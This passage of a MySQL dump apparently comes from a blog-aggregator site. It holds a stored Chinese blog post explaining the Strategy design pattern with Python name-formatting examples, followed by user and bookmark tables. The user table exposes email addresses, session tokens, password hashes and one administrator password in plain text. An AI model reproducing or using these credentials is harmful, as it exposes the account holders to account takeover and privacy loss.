&quot;&quot;&quot;</span>\n    <span class="c"># Locale 是个虚构出来的类, 用于获取当前区域</span>\n    <span class="k">if</span> <span class="n">Locale</span><span class="o">.</span><span class="n">current</span> <span class="o">==</span> <span class="n">Locale</span><span class="o">.</span><span class="n">ZH_CN</span><span class="p">:</span>\n        <span class="c"># 姓在前, 名在后</span>\n        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_name</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">first_name</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="k">return</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">first_name</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_name</span><span class="p">)</span>\n</pre></div>\n</figure><p>但是不得不说，这是一个尽管有效但是丑陋的做法。尽管现在看起来不丑陋，但是如果某个我们不熟悉国家以更加奇怪的方式组织名字呢？我们应该继续在判断中添加 elif ？还是用 switch ？（很高兴 Python 语法里没有 switch 结构）</p>\n<p>其实现在问题有点像我们的多用螺丝刀头了，我们应该把控制名字显示方式的逻辑分离出来，这样无论出现多少种情况我们都能从容应对。</p>\n<figure class="code"><div class="highlight"><pre><span class="c"># 建立一个 screenname 模块</span>\n\n<span class="k">def</span> <span class="nf">chinese</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="n">mid_name</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 中国组织名字的策略 &quot;&quot;&quot;</span>\n    <span class="k">assert</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">last_name</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">unicode</span><span class="p">)</span>\n    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">last_name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>\n        <span class="c"># 对于复姓, 放置一个空格</span>\n        <span class="k">return</span> <span class="s">u&quot;</span><span class="si">%(last_name)s</span><span class="s"> </span><span class="si">%(first_name)s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">locals</span><span class="p">()</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="k">return</span> <span class="n">last_name</span> <span class="o">+</span> <span class="n">first_name</span>\n\n<span class="k">def</span> <span class="nf">western_normal</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="n">mid_name</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 西方一般名字策略 &quot;&quot;&quot;</span>\n    <span class="k">if</span> <span class="n">mid_name</span><span class="p">:</span>\n        <span class="k">return</span> <span class="s">u&quot;</span><span class="si">%(first_name)s</span><span class="s"> </span><span class="si">%(mid_name)s</span><span class="s"> </span><span class="si">%(last_name)s</span><span class="s">&quot;</span>\n               <span class="o">%</span> <span class="nb">locals</span><span class="p">()</span>\n    <span class="k">else</span><span class="p">:</span>\n        <span class="k">return</span> <span class="s">u&quot;</span><span class="si">%(first_name)s</span><span class="s"> </span><span class="si">%(last_name)s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">locals</span><span class="p">()</span>\n\n<span class="k">def</span> <span class="nf">western_normal</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="n">mid_name</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 更 pythonic 一些的西方一般名字策略 &quot;&quot;&quot;</span>\n    <span class="c"># 上面那个实在太罗嗦</span>\n    <span class="n">name</span> <span class="o">=</span> <span class="p">[</span><span class="n">first_name</span><span class="p">,</span><span class="n">mid_name</span><span class="p">,</span><span class="n">last_name</span><span class="p">]</span>\n    <span class="k">return</span> <span class="s">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>\n\n<span class="k">def</span> <span class="nf">c_programmer</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="n">mid_name</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; C 程序员 &quot;&quot;&quot;</span>\n    <span class="n">name</span> <span class="o">=</span> <span class="p">[</span><span class="n">first_name</span><span class="o">.</span><span class="n">lower</span><span class="p">(),</span>\n            <span class="n">last_name</span><span class="o">.</span><span class="n">lower</span><span class="p">(),</span>\n            <span class="n">mid_name</span><span class="o">.</span><span class="n">lower</span><span class="p">()]</span>\n    <span class="k">return</span> <span class="s">&quot;_&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>\n\n<span class="k">def</span> <span class="nf">sage</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="n">mid_name</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 圣人专用 Saint Peter &quot;&quot;&quot;</span>\n    <span class="n">name</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;Saint&quot;</span><span class="p">,</span><span class="n">first_name</span><span class="p">,</span><span class="n">last_name</span><span class="p">,</span><span class="n">mid_name</span><span class="p">]</span>\n    <span class="k">return</span> <span class="s">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>\n</pre></div>\n</figure><p>然后情况就简单多了：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">screenname</span>\n\n<span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot; 网站注册用户 &quot;&quot;&quot;</span>\n    <span class="n">screenname_strategies</span> <span class="o">=</span> <span class="p">{}</span>\n    <span class="n">default_screenname_strategy</span> <span class="o">=</span> <span class="bp">None</span>\n\n    <span class="nd">@classmethod</span>\n    <span class="k">def</span> <span class="nf">add_screenname_strategy</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">locale</span><span class="p">,</span> <span class="n">formatter</span><span class="p">):</span>\n        <span class="n">cls</span><span class="o">.</span><span class="n">screenname_strategies</span><span class="p">[</span><span class="n">locale</span><span class="p">]</span> <span class="o">=</span> <span class="n">formatter</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">first_name</span><span class="p">,</span> <span class="n">last_name</span><span class="p">,</span> <span class="n">mid_name</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">first_name</span> <span class="o">=</span> <span class="n">first_name</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">last_name</span> <span class="o">=</span> <span class="n">last_name</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">mid_name</span> <span class="o">=</span> <span class="n">mid_name</span>\n\n    <span class="nd">@property</span>\n    <span class="k">def</span> <span class="nf">screen_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="sd">&quot;&quot;&quot; 屏幕显示的姓名 &quot;&quot;&quot;</span>\n        <span class="n">strategies</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">screenname_strategies</span>\n        <span class="n">default</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">default_screenname_strategy</span>\n\n        <span class="n">strategy</span> <span class="o">=</span> <span class="n">strategies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">Locale</span><span class="o">.</span><span class="n">current</span><span class="p">,</span> <span class="n">default</span><span class="p">)</span>\n        <span class="k">return</span> <span class="n">strategy</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">first_name</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_name</span><span class="p">,</span>\n                        <span class="bp">self</span><span class="o">.</span><span class="n">mid_name</span><span class="p">)</span>\n\n<span class="n">User</span><span class="o">.</span><span class="n">default_screenname_strategy</span> <span class="o">=</span> <span class="n">screenname</span><span class="o">.</span><span class="n">chinese</span>\n\n<span class="n">L</span> <span class="o">=</span> <span class="n">Locale</span>\n<span class="n">User</span><span class="o">.</span><span class="n">add_screenname_strategy</span><span class="p">(</span><span class="n">L</span><span class="o">.</span><span class="n">ZH_CN</span><span class="p">,</span> <span class="n">screenname</span><span class="o">.</span><span class="n">chinese</span><span class="p">)</span>\n<span class="n">User</span><span class="o">.</span><span class="n">add_screenname_strategy</span><span class="p">(</span><span class="n">L</span><span class="o">.</span><span class="n">EN_US</span><span class="p">,</span> <span class="n">screenname</span><span class="o">.</span><span class="n">western_normal</span><span class="p">)</span>\n<span class="n">User</span><span class="o">.</span><span class="n">add_screenname_strategy</span><span class="p">(</span><span class="n">L</span><span class="o">.</span><span class="n">EN_UK</span><span class="p">,</span> <span class="n">screenname</span><span class="o">.</span><span class="n">western_normal</span><span class="p">)</span>\n<span class="n">User</span><span class="o">.</span><span class="n">add_screenname_strategy</span><span class="p">(</span><span class="n">L</span><span class="o">.</span><span class="n">MARTIAN</span><span class="p">,</span> <span class="n">screenname</span><span class="o">.</span><span class="n">c_programmer</span><span class="p">)</span>\n\n<span class="n">signed_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="s">&quot;某某&quot;</span><span class="p">,</span> <span class="s">&quot;张&quot;</span><span class="p">)</span>\n<span class="k">print</span><span class="p">(</span><span class="n">signed_user</span><span class="o">.</span><span class="n">screen_name</span><span class="p">)</span>\n</pre></div>\n</figure><p>可以看出，把策略分离出来管理之后，更加复杂的情况都能应对得很有序了。我们甚至能在上述基础上做更多动作 —— 现在我们是根据 Locale 来判断使用哪个策略的，我们还可以把判断依据都分离出来，提供一组 lambda 表达式作为判断依据，从参数传入。这样我们就能从更多维度去处理，而对 User 模型没有丝毫侵入。没有侵入模型意味着极低的耦合，这也是我们所追求的。</p>\n<p>事实上，策略模式的大多数用武之地比这个例子要复杂的多。维基百科举出的就是一个和实际很贴近的例子：税率计算。但我想它们的本质是一样的，把有多种选择的部分分离出来，作为**可装卸**部件。这是设计模式中诸多组合用法的一种，和其他用到组合思想的模式相比，策略模式比较突出的特点在于，策略模式着重于分离算法，尤其是复杂算法。我们的 screen name 其实是一种非常简单的情况，所以我选择把函数作为策略对象。在一些规模更加大型的应用中，策略往往会非常复杂，开发者往往会选择定义若干个策略类，然后把策略类的实例作为策略对象。这也是大多数用 Java/C# 描述策略模式的例子中的做法。（事实上 Java 只能选择后者，而不能像 Python/Ruby 一样把函数/代码块作为策略对象，即使策略情景非常简单）</p>\n<p>上述例子中，User 类作为不被入侵的模型，为策略对象提供了运行的上下文，我们一般称为 <em>Context</em> 。而 screenname 模块中的各个策略对象，才是我们的主角 <em>Strategy</em> 。策略模式的通用做法，就像多用螺丝刀一样，往 Context 上安装 Strategy，在不同的情景下使用不同的 Strategy 来工作。</p>\n<p>剩下的问题，就是什么时候该使用策略模式了，或者称之为“使用的时机”。</p>\n<p>大二的时候我初涉设计模式，恨不得把所有的模式搬出来用一用，就像学了新招式一定要试一试一样。甚至有时候会可笑到在注释中写上我用了什么模式。后来一位博客哥说了句“把设计模式的名字写出来，就像比武之前要把招式喊出来一样好笑”，我彻底石化。</p>\n<p>初学者很容易犯这类可笑的错误，现在自己想起来都好笑。但问题是，已经不是初学者之后，应该如何把握模式使用的时机呢？</p>\n<p>就拿策略模式而言，我个人的看法是：被动地使用。不要一开始设计的时候就假想某地方将来会多么多变，给它一个策略模式。这种做法是一个危险的信号，过度设计带来的混乱绝对不亚于设计不足。我认为应该在开始设计的时候先彻底忘掉策略模式，除非已经有领域经验，告诉我们此地一定会需要策略分离 —— 这种情况则会非常明显的在设计/建模的文档中指出。除此之外，我们应该等闻到一丝丝代码坏味道了才开始分离策略。就像上述的 name screen ，添加西方国家命名方式的时候，我开始有了混乱的感觉，开始担忧如果有更多命名方式怎么办。此时才在文档注释中标识将可能面临策略分离（而不是现在就动手）。当我的担忧开始变为现实，更多的命名模式真的开始到来了，这是我在文档注释中把“可能”二字删去，标识上 “&lt;em&gt;todo:&lt;/em&gt;” ，然后动手开始分离策略。</p>\n<p>不得不说，策略模式理解起来不难。其实其他设计模式也是如此。真正值得我们去思考的，是应该如何使用这些模式。教我们统一建模语言的陈昊老师和教软件需求课的尹剑飞老师都曾这样描述“模式”二字：模式是抽取可重用的经验。所以既然是从经验中抽取出来的而不是从定义推导出来的，我们就不应该像套公式一样去套模式。这些模式仅仅是提供我们一种思维方向，提供一种解决问题的思路，而不是给我们照套。正因为如此，程序员们才有了不会失业的保证 —— 如果写程序套公式是可行的套路，那么为何不用程序来自动生成程序呢。</p>\n<p>本文的例子举的非常简单，实际场景中策略模式往往用在非常复杂的情况下，所以那些场景下的策略对象绝不会是一个小函数。这类例子，推荐下列文章：</p>\n<ul class="simple">\n<li>jokes000 在博客园的博文 “设计模式--策略模式” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id9" id="id4">[3]</a></li>\n<li>justinw 在博客园的博文 “鸭子-策略模式（Strategy）” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id10" id="id5">[4]</a></li>\n</ul>\n<table class="docutils footnote" frame="void" id="id6" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[1]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/wiki/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F">维基百科的“策略模式”词条</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id8" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[2]</a></td><td><a class="reference external" href="http://en.wikipedia.org/wiki/Strategy_pattern">维基百科英文站的“Strategy</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id9" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[3]</a></td><td><a class="reference external" href="http://www.cppblog.com/jokes000/archive/2011/10/09/157892.html">jokes000 在博客园的博文 “设计模式--策略模式”</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id10" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id5">[4]</a></td><td><a class="reference external" href="http://www.cnblogs.com/justinw/archive/2007/02/06/641414.html">justinw 在博客园的博文 “鸭子-策略模式（Strategy）”</a></td></tr>\n</tbody>\n</table>', '2014-11-06 23:43:08', 6, '2011-10-16 04:26:00', '2011-10-16 04:26:00', 0, '[["name", 0.8851233671313027], ["last", 0.30251051788031863], ["first", 0.2801023313706654], ["self", 0.24649005160618556], ["screenname", 0.2128777718417057], ["\\u7b56\\u7565", 0.2014172587387535], ["\\u6a21\\u5f0f", 0.1582514786825492], ["mid", 0.15685730556757263], ["return", 0.12324502580309278], ["User", 0.12324502580309278], ["def", 0.12324502580309278], ["strategy", 0.11204093254826616], ["Strategy", 0.08963274603861293], ["\\u8bbe\\u8ba1\\u6a21\\u5f0f", 0.08209998410149953], ["screen", 0.07842865278378632], ["\\u6211\\u4eec", 0.07310244914786317], ["Locale", 0.0672245595289597], ["strategies", 0.05602046627413308], ["add", 0.05602046627413308], ["default", 0.05602046627413308]]', NULL, NULL, '策略模式（Strategy Pattern）来自四人帮的《设计模式：可复用面向对象软件的基础》一书。先看维基百科的描述：\n\n维基中文站的词条“策略模式” [1]\nWIKIPEDIA(EN) Strategy Pattern [2]\n\n而我对它的理解，是“隔离出**有多种选择的部分**”，就如工具箱里的多用螺丝刀——一把螺丝刀可以装上十字头、一字头甚至是锥子头。\n\n\n这种“有多种选择”的情况，可以很容易举出例子。例如网站的数据库中，保存了每个用户的 first name 和 last name，也保存了中国人的姓和名。中国人是姓在前名在后，但是按照西方习惯，first name 是名，last name 是姓。这个不是问题，因为我们的网站只面向国内。\nclass User(object):\n    """ 网站注册用户 """\n\n    def __init__(self, first_name, last_name, **profile):\n        self.first_name = first_name\n        self.last_name = last_name\n        self.profile = profile\n\n    @property\n    def screen_name(self):\n        """ 屏幕显示的姓名 """\n        # 姓在前, 名在后\n        return self.last_name + self.first_name\n\n# 视图层调用，只需要如下\nsigned_user = User("某某", "张")\nprint(signed_user.screen_name)\n\n很快问题来了，我们要面向国际化了 —— 如果还按照原来的方式显示，就会把非中国人的 first name 和 last name 颠倒过来显示。我们可以修改一下代码解决这个问题。\n@property\ndef screen_name(self):\n    """ 屏幕显示的姓名 """\n    # Locale 是个虚构出来的类, 用于获取当前区域\n    if Locale.current == Locale.ZH_CN:\n        # 姓在前, 名在后\n        return self.last_name + self.first_name\n    else:\n        return "%s %s" % (self.first_name, self.last_name)\n\n但是不得不说，这是一个尽管有效但是丑陋的做法。尽管现在看起来不丑陋，但是如果某个我们不熟悉国家以更加奇怪的方式组织名字呢？我们应该继续在判断中添加 elif ？还是用 switch ？（很高兴 Python 语法里没有 switch 结构）\n其实现在问题有点像我们的多用螺丝刀头了，我们应该把控制名字显示方式的逻辑分离出来，这样无论出现多少种情况我们都能从容应对。\n# 建立一个 screenname 模块\n\ndef chinese(first_name, last_name, mid_name):\n    """ 中国组织名字的策略 """\n    assert(type(last_name) is unicode)\n    if len(last_name) > 1:\n        # 对于复姓, 放置一个空格\n        return u"%(last_name)s %(first_name)s" % locals()\n    else:\n        return last_name + first_name\n\ndef western_normal(first_name, last_name, mid_name):\n    """ 西方一般名字策略 """\n    if mid_name:\n        return u"%(first_name)s %(mid_name)s %(last_name)s"\n               % locals()\n    else:\n        return u"%(first_name)s %(last_name)s" % locals()\n\ndef western_normal(first_name, last_name, mid_name):\n    """ 更 pythonic 一些的西方一般名字策略 """\n    # 上面那个实在太罗嗦\n    name = [first_name,mid_name,last_name]\n    return " ".join(name)\n\ndef c_programmer(first_name, last_name, mid_name):\n    """ C 程序员 """\n    name = [first_name.lower(),\n            last_name.lower(),\n            mid_name.lower()]\n    return "_".join(name)\n\ndef sage(first_name, last_name, mid_name):\n    """ 圣人专用 Saint Peter """\n    name = ["Saint",first_name,last_name,mid_name]\n    return " ".join(name)\n\n然后情况就简单多了：\nimport screenname\n\nclass User(object):\n    """ 网站注册用户 """\n    screenname_strategies = {}\n    default_screenname_strategy = None\n\n    @classmethod\n    def add_screenname_strategy(cls, locale, formatter):\n        cls.screenname_strategies[locale] = formatter\n\n    def __init__(self, first_name, last_name, mid_name=""):\n        self.first_name = first_name\n        self.last_name = last_name\n        self.mid_name = mid_name\n\n    @property\n    def screen_name(self):\n        """ 屏幕显示的姓名 """\n        strategies = self.screenname_strategies\n        default = self.default_screenname_strategy\n\n        strategy = strategies.get(Locale.current, default)\n        return strategy(self.first_name, self.last_name,\n                        self.mid_name)\n\nUser.default_screenname_strategy = screenname.chinese\n\nL = Locale\nUser.add_screenname_strategy(L.ZH_CN, screenname.chinese)\nUser.add_screenname_strategy(L.EN_US, screenname.western_normal)\nUser.add_screenname_strategy(L.EN_UK, screenname.western_normal)\nUser.add_screenname_strategy(L.MARTIAN, screenname.c_programmer)\n\nsigned_user = User("某某", "张")\nprint(signed_user.screen_name)\n\n可以看出，把策略分离出来管理之后，更加复杂的情况都能应对得很有序了。我们甚至能在上述基础上做更多动作 —— 现在我们是根据 Locale 来判断使用哪个策略的，我们还可以把判断依据都分离出来，提供一组 lambda 表达式作为判断依据，从参数传入。这样我们就能从更多维度去处理，而对 User 模型没有丝毫侵入。没有侵入模型意味着极低的耦合，这也是我们所追求的。\n事实上，策略模式的大多数用武之地比这个例子要复杂的多。维基百科举出的就是一个和实际很贴近的例子：税率计算。但我想它们的本质是一样的，把有多种选择的部分分离出来，作为**可装卸**部件。这是设计模式中诸多组合用法的一种，和其他用到组合思想的模式相比，策略模式比较突出的特点在于，策略模式着重于分离算法，尤其是复杂算法。我们的 screen name 其实是一种非常简单的情况，所以我选择把函数作为策略对象。在一些规模更加大型的应用中，策略往往会非常复杂，开发者往往会选择定义若干个策略类，然后把策略类的实例作为策略对象。这也是大多数用 Java/C# 描述策略模式的例子中的做法。（事实上 Java 只能选择后者，而不能像 Python/Ruby 一样把函数/代码块作为策略对象，即使策略情景非常简单）\n上述例子中，User 类作为不被入侵的模型，为策略对象提供了运行的上下文，我们一般称为 Context 。而 screenname 模块中的各个策略对象，才是我们的主角 Strategy 。策略模式的通用做法，就像多用螺丝刀一样，往 Context 上安装 Strategy，在不同的情景下使用不同的 Strategy 来工作。\n剩下的问题，就是什么时候该使用策略模式了，或者称之为“使用的时机”。\n大二的时候我初涉设计模式，恨不得把所有的模式搬出来用一用，就像学了新招式一定要试一试一样。甚至有时候会可笑到在注释中写上我用了什么模式。后来一位博客哥说了句“把设计模式的名字写出来，就像比武之前要把招式喊出来一样好笑”，我彻底石化。\n初学者很容易犯这类可笑的错误，现在自己想起来都好笑。但问题是，已经不是初学者之后，应该如何把握模式使用的时机呢？\n就拿策略模式而言，我个人的看法是：被动地使用。不要一开始设计的时候就假想某地方将来会多么多变，给它一个策略模式。这种做法是一个危险的信号，过度设计带来的混乱绝对不亚于设计不足。我认为应该在开始设计的时候先彻底忘掉策略模式，除非已经有领域经验，告诉我们此地一定会需要策略分离 —— 这种情况则会非常明显的在设计/建模的文档中指出。除此之外，我们应该等闻到一丝丝代码坏味道了才开始分离策略。就像上述的 name screen ，添加西方国家命名方式的时候，我开始有了混乱的感觉，开始担忧如果有更多命名方式怎么办。此时才在文档注释中标识将可能面临策略分离（而不是现在就动手）。当我的担忧开始变为现实，更多的命名模式真的开始到来了，这是我在文档注释中把“可能”二字删去，标识上 “<em>todo:</em>” ，然后动手开始分离策略。\n不得不说，策略模式理解起来不难。其实其他设计模式也是如此。真正值得我们去思考的，是应该如何使用这些模式。教我们统一建模语言的陈昊老师和教软件需求课的尹剑飞老师都曾这样描述“模式”二字：模式是抽取可重用的经验。所以既然是从经验中抽取出来的而不是从定义推导出来的，我们就不应该像套公式一样去套模式。这些模式仅仅是提供我们一种思维方向，提供一种解决问题的思路，而不是给我们照套。正因为如此，程序员们才有了不会失业的保证 —— 如果写程序套公式是可行的套路，那么为何不用程序来自动生成程序呢。\n本文的例子举的非常简单，实际场景中策略模式往往用在非常复杂的情况下，所以那些场景下的策略对象绝不会是一个小函数。这类例子，推荐下列文章：\n\njokes000 在博客园的博文 “设计模式--策略模式” [3]\njustinw 在博客园的博文 “鸭子-策略模式（Strategy）” [4]\n\n\n\n\n[1]维基百科的“策略模式”词条\n\n\n\n\n\n[2]维基百科英文站的“Strategy\n\n\n\n\n\n[3]jokes000 在博客园的博文 “设计模式--策略模式”\n\n\n\n\n\n[4]justinw 在博客园的博文 “鸭子-策略模式（Strategy）”\n\n', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL,
  `name` varchar(50) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `avatar` varchar(200) DEFAULT NULL,
  `password` varchar(200) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `is_admin` tinyint(1) DEFAULT NULL,
  `last_read_at` datetime DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT NULL,
  `token` varchar(50) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `name`, `email`, `avatar`, `password`, `created_at`, `is_admin`, `last_read_at`, `is_active`, `token`) VALUES
(1, 'hustlzp', 'hustlzp@qq.com', NULL, 'xiaowangzi', NULL, 1, NULL, NULL, NULL),
(3, 'hehe', 'hehe@qq.com', NULL, 'pbkdf2:sha1:1000$1TucZ1OH$06ad74b04c78251e5440151b5377f1263eb933f3', '2014-01-24 20:53:54', 1, '2015-03-23 00:31:31', 1, 'nsNxXRorq0nr6luA'),
(12, 'xixi', '724475543@qq.com', NULL, 'pbkdf2:sha1:1000$hRkj5mV9$21f068afbf2b228e88bfadca41f1b9fa75247c11', '2015-01-26 10:11:40', 0, '2015-01-26 10:11:40', 0, 'PWq0Tu6D51DVYW3O'),
(13, 'wawa', 'hustoe@163.com', NULL, 'pbkdf2:sha1:1000$LkcLvRJP$0cb045c18f8d4eccc918513093b18f5c99a4ab89', '2015-01-26 10:15:55', 0, '2015-01-26 10:15:55', 0, 'ShsVSA5sjLO9bv4Y');

-- --------------------------------------------------------

--
-- Table structure for table `user_blog`
--

CREATE TABLE IF NOT EXISTS `user_blog` (
  `id` int(11) NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `blog_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `user_blog`
--

INSERT INTO `user_blog` (`id`, `created_at`, `blog_id`, `user_id`) VALUES
(15, '2015-01-25 00:10:07', 2, 3),
(16, '2015-01-25 17:58:57', 6, 3),
(17, '2015-01-25 17:58:58', 7, 3);

-- --------------------------------------------------------

--
-- Table structure for table `user_collect_post`
--

CREATE TABLE IF NOT EXISTS `user_collect_post` (
  `id` int(11) NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `post_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `user_collect_post`
--

INSERT INTO `user_collect_post` (`id`, `created_at`, `post_id`, `user_id`) VALUES
(7, '2015-03-23 00:50:40', 13, 3);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `approvement_log`
--
ALTER TABLE `approvement_log`
  ADD PRIMARY KEY (`id`),
  ADD KEY `blog_id` (`blog_id`);

--
-- Indexes for table `blog`
--
ALTER TABLE `blog`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blog_kind`
--
ALTER TABLE `blog_kind`
  ADD KEY `blog_id` (`blog_id`),
  ADD KEY `kind_id` (`kind_id`),
  ADD KEY `id` (`id`);

--
-- Indexes for table `grab_log`
--
ALTER TABLE `grab_log`
  ADD PRIMARY KEY (`id`),
  ADD KEY `blog_id` (`blog_id`);

--
-- Indexes for table `kind`
--
ALTER TABLE `kind`
  ADD PRIMARY KEY (`id`),
  ADD KEY `parent_id` (`parent_id`);

--
-- Indexes for table `post`
--
ALTER TABLE `post`
  ADD PRIMARY KEY (`id`),
  ADD KEY `blog_id` (`blog_id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `name` (`name`);

--
-- Indexes for table `user_blog`
--
ALTER TABLE `user_blog`
  ADD PRIMARY KEY (`id`),
  ADD KEY `blog_id` (`blog_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `user_collect_post`
--
ALTER TABLE `user_collect_post`
  ADD PRIMARY KEY (`id`),
  ADD KEY `post_id` (`post_id`),
  ADD KEY `user_id` (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `approvement_log`
--
ALTER TABLE `approvement_log`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT for table `blog`
--
ALTER TABLE `blog`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=35;
--
-- AUTO_INCREMENT for table `blog_kind`
--
ALTER TABLE `blog_kind`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT for table `grab_log`
--
ALTER TABLE `grab_log`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `kind`
--
ALTER TABLE `kind`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT for table `post`
--
ALTER TABLE `post`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=622;
--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT for table `user_blog`
--
ALTER TABLE `user_blog`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=18;
--
-- AUTO_INCREMENT for table `user_collect_post`
--
ALTER TABLE `user_collect_post`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=8;
--
-- Constraints for dumped tables
--

--
-- Constraints for table `approvement_log`
--
ALTER TABLE `approvement_log`
  ADD CONSTRAINT `approvement_log_ibfk_1` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`);

--
-- Constraints for table `blog_kind`
--
ALTER TABLE `blog_kind`
  ADD CONSTRAINT `blog_kind_ibfk_1` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`),
  ADD CONSTRAINT `blog_kind_ibfk_2` FOREIGN KEY (`kind_id`) REFERENCES `kind` (`id`);

--
-- Constraints for table `grab_log`
--
ALTER TABLE `grab_log`
  ADD CONSTRAINT `grab_log_ibfk_1` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`);

--
-- Constraints for table `kind`
--
ALTER TABLE `kind`
